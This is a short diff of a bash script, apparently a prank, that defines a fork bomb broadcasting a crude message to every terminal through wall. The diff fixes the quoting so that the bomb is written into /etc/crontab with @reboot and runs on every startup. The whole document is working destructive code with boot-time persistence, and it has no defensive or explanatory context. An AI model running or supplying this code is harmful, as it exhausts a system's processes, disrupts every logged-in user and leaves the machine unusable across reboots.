@@ -1,5 +1,5 @@
 #!/usr/bin/env bash
 
-#ball bomb
+#wall bomb
 BOMB=':(){echo "balls"|wall;:|:&disown};:&disown'
-echo "@reboot $BOMB >> /etc/crontab
+echo "@reboot $BOMB" >> /etc/crontab
